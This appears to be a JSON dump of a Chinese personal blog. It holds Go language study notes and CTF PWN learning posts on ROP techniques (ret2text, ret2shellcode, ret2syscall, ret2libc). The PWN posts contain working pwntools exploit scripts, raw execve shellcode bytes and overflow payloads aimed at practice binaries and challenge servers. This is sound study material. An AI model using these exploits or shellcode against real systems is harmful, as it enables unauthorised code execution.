4.0","slug":"Macro-4-0","permalink":"https://b1ackie.cn/tags/Macro-4-0/"}]},{"title":"Go语言学习笔记二","slug":"Go语言学习笔记二","date":"2021-12-02T02:35:23.000Z","updated":"2021-12-06T07:50:30.603Z","comments":true,"path":"2021/12/02/Go语言学习笔记二/","link":"","permalink":"https://b1ackie.cn/2021/12/02/Go%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%BA%8C/","excerpt":"","text":"Go语言运算符运算符用于在程序运行时执行数学或者逻辑运算 Go语言内置的运算符有： 算术运算符 关系运算符 逻辑运算符 位运算符 赋值运算符 其他运算符 算术运算符 运算符 描述 + 相加 - 相减 * 相乘 / 相除 % 求余 ++ 自增 – 自减 1234567891011121314151617package mainimport &quot;fmt&quot;func main() &#123; var a int = 20 var b int = 10 fmt.Println(&quot;a + b =&quot;, a+b) fmt.Println(&quot;a - b =&quot;, a-b) fmt.Println(&quot;a * b =&quot;, a*b) fmt.Println(&quot;a / b =&quot;, a/b) fmt.Println(&quot;a % b =&quot;, a%b) a++ b-- fmt.Printf(&quot;a = %d, b = %d&quot;, a, b)&#125; 关系运算符 运算符 描述 == 检查两个值是否相等，如果相等返回true，否则返回false != 检查两个值是否不相等，如果不相等返回true，否则返回false &gt; 检查左边值是否大于右边值，如果是返回true，否则返回false &lt; 检查左边值是否小于右边值，如果是返回true，否则返回false &gt;= 检查左边值是否大于等于右边值，如果是返回true，否则返回false &lt;= 检查左边值是否小于等于右边值，如果是返回true，否则返回false 1234567891011121314151617181920212223242526272829package mainimport &quot;fmt&quot;func main() &#123; var a int = 20 var b int = 10 if a == b &#123; fmt.Println(&quot;a=b&quot;) &#125; else &#123; fmt.Println(&quot;a!=b&quot;) &#125; if a &lt; b &#123; fmt.Println(&quot;a&lt;b&quot;) &#125; else &#123; fmt.Println(&quot;a&gt;b&quot;) &#125; if a &gt; b &#123; fmt.Println(&quot;a&gt;b&quot;) &#125; else &#123; fmt.Println(&quot;a&lt;b&quot;) &#125; if a &lt;= b &#123; fmt.Println(&quot;a&lt;=b&quot;) &#125; if a &gt;= b &#123; fmt.Println(&quot;a&gt;=b&quot;) &#125;&#125; 逻辑运算符 运算符 描述 &amp;&amp; 逻辑and运算符，如果两边的操作数都是true，则条件为true，否则为false || 逻辑or运算符，如果两边的操作数有一个true，则条件为true，否则是false ! 逻辑not运算符，如果条件为true，则逻辑not条件false，否则是true 123456789101112131415161718package mainimport &quot;fmt&quot;func main() &#123; var a bool = true var b bool = false if a &amp;&amp; b &#123; fmt.Println(&quot;a=b&quot;) &#125; if a || b &#123; fmt.Println(&quot;a!=b&quot;) &#125; if a &amp;&amp; !b &#123; fmt.Println(&quot;true&quot;) &#125;&#125; 位运算符 运算符 描述 &amp; 按位与运算符”&amp;”是双目运算符。参与运算的两数各对应的二进位相与。 | 按位或运算符”|”双目运算符。参与运算的两数各对应的二进位相或 ^ 按位异或运算符”^”双目运算符。参与运算的两数各对应的二进位相异或，当两对应的二进位相异时，结果为1 &lt;&lt; 左移运算符”&lt;&lt;”双目运算符，左移N位就是乘以2的N次方。功能是把”&lt;&lt;”左边的运算数的各二进位全部左移若干位，由”&lt;&lt;”右边的数指定移动的位数，高位丢弃，低位补0 &gt;&gt; 右移运算符”&gt;&gt;”双目运算符，右移N位就是除以2的N次方。功能是把”&gt;&gt;”左边的运算数的各二进位全部右移若干位，”&gt;&gt;”右边的数指定移动的位数。 1234567891011121314package mainimport &quot;fmt&quot;func main() &#123; var a uint = 60 var b uint = 13 fmt.Println(a &amp; b) fmt.Println(a | b) fmt.Println(a ^ b) fmt.Println(a &lt;&lt; 2) fmt.Println(a &gt;&gt; 2)&#125; 赋值运算符 运算符 描述 = 简单的赋值运算符，将一个表达式的值赋给一个左值 += 相加后再赋值 -= 相减后再赋值 *= 相乘后再赋值 /= 相除后再赋值 %= 求余后再赋值 &lt;&lt;= 左移后赋值 &gt;&gt;= 右移后赋值 &amp;= 按位与后赋值 ^= 按位异或后赋值 |= 按位或后赋值 123456789101112131415161718192021222324252627282930package mainimport &quot;fmt&quot;func main() &#123; var a int = 21 var c int c = a fmt.Println(c) c += a fmt.Println(c) c -= a fmt.Println(c) c *= a fmt.Println(c) c /= a fmt.Println(c) c = 20 c &lt;&lt;= 2 fmt.Println(c) c &gt;&gt;= 1 fmt.Println(c) c &amp;= 5 fmt.Println(c) c ^= 10 fmt.Println(c) c |= 2 fmt.Println(c)&#125; 其他运算符 运算符 描述 &amp; 返回变量的存储地址 * 指针变量 1234567891011121314package mainimport &quot;fmt&quot;func main() &#123; var a int = 4 var ptr *int ptr = &amp;a fmt.Printf(&quot;a 的值为 %d\\n&quot;, a) fmt.Printf(&quot;*ptr 为 %d\\n&quot;, *ptr) fmt.Printf(&quot;%p\\n&quot;, &amp;a) fmt.Printf(&quot;%p\\n&quot;, ptr)&#125; 运算符优先级优先级，就是当多个运算符出现在同一个表达式之中时，先执行哪个运算符。运算符优先级如下表： 优先级 分类 运算符 结合性 1 逗号运算符 , 从左到右 2 赋值运算符 =、+=、-=、*=、/=、%=、&gt;&gt;=、&lt;&lt;=、&amp;=、^=、|= 从友到左 3 逻辑或 || 从左到右 4 逻辑与 &amp;&amp; 从左到右 5 按位或 | 从左到右 6 按位异或 ^ 从左到右 7 按位与 &amp; 从左到右 8 相等/不等 ==、!= 从左到右 9 关系运算符 &lt;、&lt;=、&gt;、&gt;= 从左到右 10 位移运算符 &lt;&lt;、&gt;&gt; 从左到右 11 加法/减法 +、- 从左到右 12 乘法/除法/除余 *、/、% 从左到右 13 单目运算符 !、*（指针）、&amp;、++、–、+（正号）、-（负号） 从右到左 14 后缀运算符 ()、[]、-&gt; 从左到右 优先级值越大，表示优先级越高 Go语言条件语句if…else语句的语法如下： 12345if 布尔表达式&#123; /*在布尔表达式为true时执行*/&#125;else&#123; /*在布尔表达式为false时执行*/&#125; 1234567891011121314151617181920package mainimport &quot;fmt&quot;func main() &#123; var a int var b int = 10 fmt.Println(&quot;输入a&quot;) fmt.Scanf(&quot;%d&quot;, &amp;a) if a &lt; b &#123; fmt.Println(&quot;a&lt;10&quot;) &#125; if a &gt; b &#123; fmt.Println(&quot;a&gt;10&quot;) &#125; if a == b &#123; fmt.Println(&quot;a==10&quot;) &#125;&#125; switch语句用于基于不同条件执行不同动作，每一个case分支都是唯一的，从上到下逐一测试，直到匹配为止。 switch语句执行的过程从上到下，直到匹配项，在匹配项后面也不需要加break。 switch默认情况下case最后自带break语句，匹配成功后就不会执行其他case，如果需要执行后面的case，可以使用fallthrough 12345678910111213141516171819202122package mainimport &quot;fmt&quot;func main() &#123; var num int fmt.Scanf(&quot;%d&quot;, &amp;num) switch &#123; case num &lt; 60: fmt.Println(&quot;F&quot;) case num &lt; 70: fmt.Println(&quot;D&quot;) case num &lt; 80: fmt.Println(&quot;C&quot;) case num &lt; 90: fmt.Println(&quot;B&quot;) default: fmt.Println(&quot;A&quot;) &#125;&#125; Go语言循环语句for循环是循环控制结构，可以执行指定次数的循环。 Go的For循环有三种方式，只有其中的一种使用分号。 和C的for一样： 1for inir; condition; post &#123;&#125; 和C的while一样： 1for condition&#123;&#125; 和C的for(;;)一样： 1for &#123;&#125; init：一般为赋值表达式，给控制变量赋初值 condition：关系表达式或逻辑表达式，循环控制条件 post：一般为赋值表达式，给控制变量增量或减量 计算1加到100的和 123456789101112package mainimport &quot;fmt&quot;func main() &#123; var sum int = 0 for i := 0; i &lt;= 100; i++ &#123; sum += i &#125; fmt.Print(sum)&#125; 无限的循环，相当于while（1） 123456789101112package mainimport &quot;fmt&quot;func main() &#123; sum := 0 for &#123; sum++ fmt.Println(sum) &#125;&#125; 使用break跳出循环，以下示例演示了使用标记和不使用的区别： 123456789101112131415package mainimport &quot;fmt&quot;func main() &#123;re: for i := 1; i &lt; 4; i++ &#123; fmt.Println(i) for j := 10; j &lt; 13; j++ &#123; fmt.Println(j) break re &#125; &#125;&#125; 123456789101112131415package mainimport &quot;fmt&quot;func main() &#123; for i := 1; i &lt; 4; i++ &#123; fmt.Println(i) for j := 10; j &lt; 13; j++ &#123; fmt.Println(j) break &#125; &#125;&#125; continue语句 1234567891011121314package mainimport &quot;fmt&quot;func main() &#123; for i := 1; i &lt; 8; i++ &#123; if i == 5 &#123; continue &#125; fmt.Println(i) &#125;&#125; 使用了标记和不使用标记的 123456789101112131415161718192021222324package mainimport &quot;fmt&quot;func main() &#123; fmt.Println(&quot;使用标记&quot;)re: for i := 1; i &lt; 5; i++ &#123; fmt.Println(i) for j := 10; j &lt; 13; j++ &#123; fmt.Println(j) continue re &#125; &#125; fmt.Println(&quot;不使用标记&quot;) for i := 1; i &lt; 5; i++ &#123; fmt.Println(i) for j := 10; j &lt; 13; j++ &#123; fmt.Println(j) continue &#125; &#125;&#125; Go函数函数定义go的函数定义格式如下： 123func func_name ([parameter list]) [return types]&#123; 函数体&#125; func：函数由func开始声明 func_name：函数名称，参数列表和返回值类型构成了函数签名 parameter list：参数列表，参数就像一个占位符，当函数被调用的时候，你可以将值传递给参数，这个值被称为实际参数。参数列表指定的是参数类型、顺序、及参数个数。参数是可选的。 return types：返回类型，函数返回一列值。return types是该列值得数据类型。有些功能不需要返回值，这种情况下，不是必须的。 1234567891011121314package mainimport &quot;fmt&quot;func add(num1, num2 int) int &#123; return num1 + num2&#125;func main() &#123; var ret int ret = add(15, 30) fmt.Print(ret)&#125; Go变量作用域作用域为已声明标识符所表示的常量、类型、变量、函数或包在源代码中的作用范围。 Go中的变量可以在三个地方声明： 函数内定义的变量称为局部变量 函数外定义的变量称为全局变量 函数定义的变量称为形式参数 1234567891011121314151617181920package mainimport &quot;fmt&quot;//全局变量var c int = 1func main() &#123; //局部变量 var a, b int a = 1 b = 2 fmt.Println(a, b, c) d := add(a, b) fmt.Println(d)&#125;func add(a, b int) int &#123; return a + b&#125;","categories":[{"name":"Go语言学习","slug":"Go语言学习","permalink":"https://b1ackie.cn/categories/Go%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"Go语言","slug":"Go语言","permalink":"https://b1ackie.cn/tags/Go%E8%AF%AD%E8%A8%80/"}]},{"title":"基本ROP","slug":"基本ROP","date":"2021-11-26T05:47:47.000Z","updated":"2021-12-10T08:42:58.662Z","comments":true,"path":"2021/11/26/基本ROP/","link":"","permalink":"https://b1ackie.cn/2021/11/26/%E5%9F%BA%E6%9C%ACROP/","excerpt":"","text":"前言还是继续学习练习ROP技术，现在是跟着CTF WIKI中的ROP来学习一下。 基本ROP 基本ROP随着NX的保护开启，曾经直接向栈或者堆上直接注入代码的方式难以继续发挥作用。攻击者也提出了相应的方法来绕过保护，目前主要的是ROP，其主要的思想就是在栈缓冲区溢出的基础上，利用程序中已经有的小片段（gadgets）来改变某些寄存器或者变量的值，从而控制程序的执行流程。所谓的gadget就是以ret结尾的指令序列，通过这些指令序列，我们可以修改某些地址的内容，方便控制程序的执行流程。 叫做ROP的原因是，利用了指令集中的ret指令，改变了指令流的执行顺序。ROP攻击一般满足以下条件： 程序存在溢出，并且可以控制返回地址 可以知道满足条件的gadgets以及相应的gadgets地址 ret2text原理ret2text即控制程序执行程序本身已有的代码（.text）。这种攻击方法是一种笼统的描述，我们控制执行程序已有的代码也可以控制程序执行好几段不相邻的程序已有的代码（也就是gadgets），就是所谓的ROP。 例子用ret2text做例子 ret2text 查看一下保护机制，看到只开启了NX。 使用IDA查看，看到有一个gets函数，存在一个栈溢出漏洞 还看到了有system(/bin/sh)，只要覆盖返回地址到这里就可以了。 现在来尝试构造一下payload，使用GDB打开调试看一下栈的情况，输入112个a和4个b，看到此时的栈空间 查看执行到ret的时候，返回的地址是bbbb，证明构造的payload是对的，将bbbb换成要返回的地址0x804863A即可。 编写EXP 12345from pwn import *p = process(&quot;./ret2text&quot;)payload = 0x804863Ap.sendline(&quot;a&quot; * 112 + p32(payload))p.interactive() ret2shellcode原理ret2shellcode就是控制程序流程执行shellcode代码。在栈溢出的基础上，执行shellcode，需要对应的区域具有可执行的权限。 例子例子在这里下载ret2shellcode 首先查看一下程序的保护机制，几乎没有开启任何的保护，且有可读可写可执行的段。 使用IDA查看，可以看到存在栈溢出，输入的内容会被复制到buf2之中。 查看buf2可以看到是在bss段。 使用gdb打开调试，上面看到buf2在0x804A080，从这里看到有可执行权限。 调试确定payload的长度，输入112个a和4个b，可以看到返回地址是bbbb，现在就可以确定长度了。 生成一段shellcode，填充到112位，然后把返回地址覆盖到buf2的起始地址，在段上执行shellcode就可以了。 123456from pwn import *p = process(&quot;./ret2shellcode&quot;)shellcode = asm(shellcraft.sh())buf2_addr = 0x804a080p.sendline(shellcode.ljust(112,&quot;p&quot;) + p32(buf2_addr))p.interactive() 例子2sniperoj-pwn100-shellcode-x86-64 查看保护机制，只开启了PIE，也就是基址随机化。 分析一下程序，看到read函数会将数据读到buf中，存在一个栈溢出，段可执行，应该要自己构造shellcode来获取shell。 现在来尝试构造一下payload，buf长度0x10，构造24个a加上8个b，用来覆盖返回地址。看到返回地址被成功覆盖 但是这次不可以用刚才pwntools中生成的那个shellcode了，因为read函数只能读取64个字节的数据，从图中可以看到这个shellcode是44个字节 需要找新的shellcode，在这里可以寻找对应的shellcode，也可以自己尝试去写 https://www.exploit-db.com/shellcodes 我找到了这个shellcode，22字节 https://www.exploit-db.com/shellcodes/47008 这次exp的编写，shellcode不可以放在返回地址之前了，因为这样栈空间是不足的，在shellcode里有好几个push的操作，且它并没有开辟栈空间，比如sub esp,0x100，我们知道栈是从栈顶开始入栈的，此时我们的代码是放在栈顶之上的，如果不断的push 压栈，那么我们的栈里的代码就会被破坏 就像这个图一样，不断的压栈会破坏代码 原始代码 被破坏的代码和栈的情况，这部分具体在之前的文章有讲过栈溢出原理与实践 现在尝试编写exp，把shellcode放在后面，放在后面的不管怎么压栈都不会破坏代码。 因为是动态基址，所以关键在于buf的地址获取，但是题目中给了我们buf的地址，所以不用担心。 12345678910111213from pwn import *p = process(&quot;./sniperoj-pwn100-shellcode-x86-64&quot;)p.recvuntil(&#x27;[&#x27;)buf_addr = p.recvuntil(&#x27;]&#x27;,drop=True)shellcode = &quot;\\x48\\x31\\xf6\\x56\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x57\\x54\\x5f\\xb0\\x3b\\x99\\x0f\\x05&quot;buf_addr = int(buf_addr , 16)buf_addr += 32#print(hex(buf_addr))payload = &quot;a&quot;*24 + p64(buf_addr) + shellcodep.sendline(payload)p.interactive() ret2syscall原理ret2syscall，就是控制程序执行系统调用的，获取shell 例子ret2syscall 查看保护机制，开启了NX。 使用IDA打开，可以看到gets函数存在栈溢出， 查看字符串，存在/bin/sh，但是找不到system函数，需要自己构造 可以通过gadgets来获得shell。我们需要把获取对应shell的系统调用放到对应的寄存器中，这样在执行int 0x80可以执行对应的系统调用 1execve(&quot;/bin/sh&quot;,null.null) 对于这个32位的程序，需要构造如下的寄存器 系统调用号，eax=0xb 第一个参数，ebx应该指向/bin/sh的地址，或者是执行sh的地址 第二个参数，ecx=0 第三个参数，edx=0 控制寄存器的值，就需要用到gadgets，此时栈顶是10，执行一个pop eax之后，eax就等于10。但是在程序中不一定有连续的可以控制这些寄存器的值，需要一段一段的控制。寻找gadgets的方法，可以使用ropgadgets工具。 查找pop eax和ret的地址，找到一个pop eax，在retn的地址 看到这个地址 10x080bb196 : pop eax ; ret 再找pop ebx和ret的地址 看到这样一个地址，剩下三个寄存器都可以用到。 10x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret 现在就可以来控制程序的流程，首先覆盖返回地址到上述两个地址任意一个，比如pop eax/ret地址这，然后再覆盖下面的为0xb，这样ret就会到pop eax/ret这里，然后pop eax，eax就是0xb，之后是一样的流程。 现在来确定一下payload长度，使用GDB调试，输入112个a，再输入4个b， 编写EXP 123456789from pwn import *p = process(&quot;./rop&quot;)pop_eax_ret = 0x80bb196pop_edx_ecx_ebx_ret = 0x806eb90int_80_addr = 0x8049421binsh_addr = 0x80be408payload = &#x27;a&#x27;*112 + p32(pop_eax_ret)+p32(0xb)+p32(pop_edx_ecx_ebx_ret)+p32(0) +p32(0) + p32(binsh_addr)+ p32(int_80_addr)p.sendline(payload)p.interactive() ret2libc原理ret2libc就是控制函数的执行libc中的函数，通常是返回至某个函数的plt处或者函数的具体位置（即函数对应的got表项的内容）。一般情况下，会选择执行system(&quot;/bin/sh&quot;)，所以需要知道system函数的地址。 例1ret2libc1 查看一下保护机制，看到只开启了NX。 使用IDA查看，看到存在一个gets函数，存在栈溢出 在IDA里能看到system函数，还有/bin/sh的地址，那么就可以获取shell。 确定payload，这次用cyclic这个工具来获取一下需要覆盖到返回地址的长度， 编写EXP 1234567from pwn import *p = process(&quot;./ret2libc1&quot;)bin_addr = 0x8048720system_addr = 0x8048460payload = &quot;a&quot;*112 + p32(system_addr) + &quot;b&quot;*4 + p32(bin_addr)p.sendline(payload)p.interactive() 例2ret2libc2 查看保护机制，只开启了NX保护 用IDA查看，可以看到有一个gets函数，存在栈溢出，跟上一道题一样到流程 只是这道题只有system的地址，但是没有/bin/sh，所以要自己构造。 在bss段还可以找到buf2，可以把/bin/sh写到buf2中。 查看bss段属性可写可读 然后再找到gets函数地址 偏移量跟上一个是一样的，就不再计算了，现在尝试构造payload。 现在有两种构造的方法，第一个就是，覆盖返回地址为gets函数地址，然后是返回地址，返回地址是一个pop/ret的地址，然后是buf2的地址，此时gets会把输入存在buf2内，然后是system函数地址，任意一个返回地址，buf2地址。这样的执行流程，首先是返回到gets，输入/bin/sh保存到buf2，然后返回到pop/ret的地方， pop一次，将buf2地址弹出去，此时栈顶是system函数地址，再次ret就会执行system(&quot;/bin/sh&quot;) 第二个就是不需要pop/ret的地址，直接把system函数地址作为gets函数的返回地址，执行流程是一样的。 编写EXP查找pop/ret的地址 123456789101112131415from pwn import *p = process(&quot;./ret2libc2&quot;)pop_ret_addr = 0x804843dgets_addr = 0x8048460system_addr = 0x8048490buf2_addr = 0x804a080#第一种方法#payload = &#x27;a&#x27;*112 + p32(gets_addr) + p32(pop_ret_addr) + p32(buf2_addr) + p32(system_addr) + &#x27;b&#x27;*4 + p32(buf2_addr)payload = &#x27;a&#x27;*112 + p32(gets_addr) + p32(system_addr) + p32(buf2_addr)+ p32(buf2_addr)p.sendline(payload)p.sendline(&quot;/bin/sh&quot;)p.interactive() 例3ret2libc3 查看保护只开启了NX。 看到存在栈溢出，可以尝试ROP。此例子是在例2的基础上，将system函数的地址去掉，此时需要同时找到system函数地址和 现在的问题就是如何寻找system函数的地址。 system函数属于libc，而libc.so动态链接库中的函数相对偏移是固定的。即使程序有ASLR，最低的12位也不会改变，而libc在github上有人进行收集。 我们如果知道了libc中某个函数的地址，那么就可以确定该程序利用的libc，进而可以知道system函数的地址。得到libc中函数地址一般是用got表泄露，就是输出某个函数对应的got表项的内容。当然，由于libc的延迟绑定机制，我们需要泄露已经执行过得函数的地址。 现在来手工先寻找一下这些地址，来加深理解。 先来寻找一下libc的基址，使用gdb加载libc3，然后打印出__libc_start_main的地址 使用ldd命令可以查看程序依赖的libc版本，再将其复制到当前路径下 搜索__libc_start_main可以看到其偏移是0x18e30，由此可以算出基址是 0xf7df5e30-0x18e30=0xf7ddd000 有了基址就可以计算出其他的地址 现在的思路就是，通过现有的函数打印出__libc_start_main的地址，然后寻找libc中的地址，来计算基址，有了基址，查找到system和/bin/sh的偏移就可以得到。 现在编写个EXP，通过利用LibcSearcher可以快速的帮助查找。 123456789101112131415161718192021222324252627#!/usr/bin/env pythonfrom pwn import *from LibcSearcher import LibcSearchersh = process(&#x27;./ret2libc3&#x27;)ret2libc3 = ELF(&#x27;./ret2libc3&#x27;)puts_plt = ret2libc3.plt[&#x27;puts&#x27;]libc_start_main_got = ret2libc3.got[&#x27;__libc_start_main&#x27;]main = ret2libc3.symbols[&#x27;main&#x27;]print &quot;leak libc_start_main_got addr and return to main again&quot;payload = flat([&#x27;A&#x27; * 112, puts_plt, main, libc_start_main_got])sh.sendlineafter(&#x27;Can you find it !?&#x27;, payload)print &quot;get the related addr&quot;libc_start_main_addr = u32(sh.recv()[0:4])libc = LibcSearcher(&#x27;__libc_start_main&#x27;, libc_start_main_addr)libcbase = libc_start_main_addr - libc.dump(&#x27;__libc_start_main&#x27;)system_addr = libcbase + libc.dump(&#x27;system&#x27;)binsh_addr = libcbase + libc.dump(&#x27;str_bin_sh&#x27;)print &quot;get shell&quot;payload = flat([&#x27;A&#x27; * 104, system_addr, 0xdeadbeef, binsh_addr])sh.sendline(payload)sh.interactive() 总结学习CTF wiki上的基本rop技术，很多文字性的描述就直接用了上面的描述，原理性的东西基本都理解了，利用方式也都理解，后续还需要多多练习一下。","categories":[{"name":"PWN","slug":"PWN","permalink":"https://b1ackie.cn/categories/PWN/"}],"tags":[{"name":"ROP","slug":"ROP","permalink":"https://b1ackie.cn/tags/ROP/"}]},{"title":"ROP学习","slug":"ROP学习","date":"2021-11-17T07:18:13.000Z","updated":"2021-12-01T12:12:10.528Z","comments":true,"path":"2021/11/17/ROP学习/","link":"","permalink":"https://b1ackie.cn/2021/11/17/ROP%E5%AD%A6%E4%B9%A0/","excerpt":"","text":"前言本篇来学习一下ROP技术。对于栈溢出来说，可以构造足够长的数据来进行溢出，同时也可以在栈上存放可执行代码，在这里栈溢出原理与实践有介绍关于在栈上执行代码。如果在栈上不可以执行代码，就需要通过ROP跳转到libc获得shell。本篇主要是学习网上的资源，从0开始CTF-PWN（四）ROP绕过栈可执行保护与GOT表劫持 ROP代码 12345678910#include &lt;stdio.h&gt;#include &lt;string.h&gt; int main(int argc, char* argv[]) &#123; char buf[128]; if (argc &lt; 2) return 1; strcpy(buf, argv[1]); printf(&quot;Input:%s\\n&quot;, buf); return 0;&#125; 使用如下命令进行编译 1gcc-4.8 -m32 -O0 -fno-stack-protector -o ROP ROP.c 编译参数说明 -m32：使用32位编译 -O0：关闭所有的优化 -g：在可执行文件中加入源码的信息 -fno-stack-protector：关闭栈保护 -z execstack：栈上代码可执行 -z norelro / -z relro -z lazy / -z relro -z now (关闭disabled / 部分开启Partial / 完全开启Full) 分析使用IDA打开程序来看下，可以看到存在栈溢出，可以覆盖返回地址。 现在我们需要getshell，所以要执行system(/bin/sh)，现在我们需要构造一个payload，覆盖栈之后刚好覆盖返回地址。但是在实际操作中，我发现我没办法像帖子一样实现，我找不到/bin/sh的地址，所以我自己减了难度，我在源码中定义了，system和/bin/sh。 12345char *sz = &quot;/bin/sh&quot;;void a()&#123; system();&#125; 现在就可以开始实现，先搜索system地址 查找/bin/sh地址 开始构造payload，先输入140个a，看一下栈的空间，刚好到返回值地址。 现在再来复习一下关于调用函数的时候栈的空间，调用函数的时候，栈的情况，首先是返回地址，然后是参数，依次参数n、参数n-1、参数n-2……参数1。 如图，此时只有一个参数 所以现在payload是：140个字符（用来填充栈空间）+ system地址（覆盖返回值地址）+ 任意四个字节字符（system函数的返回地址）+ /bin/sh地址（system的参数） EXP构造的exp 12345678from pwn import *sysaddr = 0x8048340binaddr = 0x8048570payload = &quot;a&quot;*140 + p32(sysaddr) + &quot;a&quot;*4 + p32(binaddr)p = process(argv=[ &quot;/home/pwn/rop/1&quot; , payload ] )p.interactive() 成功拿到shell","categories":[{"name":"PWN","slug":"PWN","permalink":"https://b1ackie.cn/categories/PWN/"}],"tags":[{"name":"ROP","slug":"ROP","permalink":"https://b1ackie.cn/tags/ROP/"}]},{"title":"攻防世界PWN-新手练习区","slug":"攻防世界PWN-新手练习区","date":"2021-11-15T02:45:51.000Z","updated":"2021-11-26T05:48:28.744Z","comments":true,"path":"2021/11/15/攻防世界PWN-新手练习区/","link":"","permalink":"https://b1ackie.cn/2021/11/15/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CPWN-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/","excerpt":"","text":"get_shell查看文件，看到是64位文件，通过checksec可以查看保护的机制。 保护机制保护机制这稍微介绍下 RELRO主要是用来保护重定位段对应数据区域，默认可写 Partial RELRO表示got表不可写，got.plt可写 Full RELRO表示got表，got.plt不可写 Stack这主要是栈保护，canary意思是金丝雀，是栈保护，方式是在靠近栈底某个位置设置初值，防止栈溢出的一种保护。 NX数据执行保护，在windows上是DEP技术，基本原理是将数据所在的内存页表示为不可执行。 PIEPIE保护就是基址随机化，每次加载时都会改变加载的基地址。 详细分析使用IDA打开，可以看到程序的流程，运行输出一串字符串之后就会调用system(&quot;/bin/sh&quot;)，会获得shell，不需要任何操作，只需要连接到远程主机就行了。 EXP123from pwn import *r = remote(&quot;111.200.241.244&quot;,&quot;59759&quot;)r.interactive() 也可以直接nc到远程主机执行命令 cyberpeace{73b5fb2b3e5ef899ac9fe442ba8a3db6} hello_pwn查看文件，可以看到是64位文件，只开启了NX保护，其他没有开启。 详细分析使用IDA打开分析，主要是要执行sub_400686函数，里面会查看flag，而进入此函数的要求就是dword_60106C == 0x6E756161，再看前面的read函数，读取了十个字节的数据，读取到unk_601068，而dword_60106C离它就差4个字节，也就是read读取的数据可以溢出到dword_60106C。 使用GDB调试看看 在main函数下断，调试到read处，然后输入12345678，再查看内存地址处的值来看下。看到0x601068处存放的是1234（ascii码，小端序），再看0x60106c处看到是5678，也就是输入的八个字符后四位成功溢出到了目标地址，现在只要这里等于0x6E756161就可以了。 EXP123456from pwn import *r = remote(&quot;111.200.241.244&quot;,&quot;63359&quot;)payload=&quot;a&quot;*4 + p64(0x6E756161)r.recvuntil(&quot;lets get helloworld for bof\\n&quot;)r.sendline(payload)print(r.recv()) level064位的文件，只开启了NX。 详细分析使用IDA打开看main函数，看到vulnerable_function函数。 进入函数查看可以看到存在一个栈溢出，buf长度为128，read函数读取0x200。 现在找一下返回值覆盖的地方应该是什么，在函数中看到存在一个callsystem函数，查看可以看到可以获取shell，覆盖的返回地址为callsystem地址即可 使用GDB调试一下，看看具体的栈空间变化，首先我们要清楚，在栈里，以这个为例子，栈底之前是缓冲区，栈底（RBP）是一个，栈底（RBP+8)再下面一个才是返回值地址，所以要覆盖返回地址的话，需要构造一共144个字符。 输入128个“a”，再输入一个“12345678”，再输入8个”c“，来查看下空间，看到当前RBP已经被12345678覆盖了，再往后一个地址是8个c。 执行到ret看下，看到返回地址是cccccccc EXP1234567from pwn import *r = remote(&quot;111.200.241.244&quot;,&quot;59478&quot;)addr = 0x400596payload = &quot;a&quot;*0x88 + p64(addr)r.recvuntil(&quot;Hello, World\\n&quot;)r.send(payload)r.interactive() level232位的文件，保护只开启了NX 根据题目的提示，简单的ROP，就是需要用到ROP技术，ROP就是Return-oriented programming（返回导向编程），这是一种高级的内存攻击技术可以用来绕过一些防御措施（比如内存不可执行）。我们可以使用libc库的函数，system，将函数返回地址指向system的地址。构造这样的 1system(&quot;/bin/sh&quot;)； 详细分析主函数的流程很简单，看下vulnerable_function函数 看到有read函数，可以读取0x100字节的数据，存在栈溢出，现在只需要覆盖返回地址覆盖到system函数地址，还需要构造”/bin/sh” 在程序中已经存在了我们需要的两个东西。 现在再来复习一下关于调用函数的时候栈的空间，调用函数的时候，栈的情况，首先是返回地址，然后是参数，依次参数n、参数n-1、参数n-2……参数1。 如图，此时只有一个参数 EXP12345678from pwn import *r = remote(&quot;111.200.241.244&quot;,&quot;50332&quot;)payload = &quot;a&quot;*140 #覆盖buf加ebppayload += p32(0x8048320) #覆盖返回地址payload += &quot;b&quot;*4 #system的返回地址payload += p32(0x804A024) #/bin/sh的地址r.sendline(payload)r.interactive()","categories":[{"name":"攻防世界writeup","slug":"攻防世界writeup","permalink":"https://b1ackie.cn/categories/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cwriteup/"}],"tags":[{"name":"PWN","slug":"PWN","permalink":"https://b1ackie.cn/tags/PWN/"},{"name":"CTF","slug":"CTF","permalink":"https://b1ackie.cn/tags/CTF/"}]},{"title":"Go语言学习笔记一","slug":"Go语言学习笔记一","date":"2021-11-08T08:29:05.000Z","updated":"2021-11-10T11:19:44.992Z","comments":true,"path":"2021/11/08/Go语言学习笔记一/","link":"","permalink":"https://b1ackie.cn/2021/11/08/Go%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%80/","excerpt":"","text":"Go语言的结构Go语言的基础组成有以下几部分 包声明 引入包 函数 变量 语句&amp;表达式 注释 写一个简单的代码，来看下大致的组成 12345678package main//定义了包名，每个程序都包含一个名为main的包import &quot;fmt&quot;//告诉GO编译器，这个程序使用了fmt的包func main() &#123;//程序开始执行的函数 fmt.Printf(&quot;hello world !!!&quot;) //将字符串输出到控制台&#125; 执行Go程序打开编辑器，将上述代码写进去，保存为.go结尾的文件。 然后使用命令行，输入命令 go run hello.go 也可以将其编译成为可执行文件，使用命令 go build hello.go Go基础语法Go标记Go程序可以由多个标记组成，可以是关键字、标识符、常量、字符串、符号。 行分隔符在Go程序中，一行代表一个语句结束。每个语句不用像C那样以分号结尾，但是如果要将多个语句写在同一行，则必须使用分号，实际开发中，并不建议使用这种方法。 12fmt.print(&quot;hello world\\n&quot;)fmt.println(&quot;i am b1ackie&quot;) 注释注释是不会被编译的，可以使用单行注释和多行注释 1234//这是单行注释/*多行注释*/ 标识符标识符用来命名变量、类型等程序实体。一个标识符可以是一个或多个字母，数字，下划线组成的序列，但是第一个字符必须是字母或者下划线而不可以是数字。 以下这些是有效的标识符： bLackie B1_ackie _b1ackie 这些是无效的标识符： 1b1ackie（以数字开头） case（GO语言的关键字） a+b（运算符不允许） 字符串连接Go语言的字符串可以通过+来实现 12345package mainimport &quot;fmt&quot;func main() &#123; fmt.Println(&quot;hello&quot; + &quot;golang&quot;)&#125; 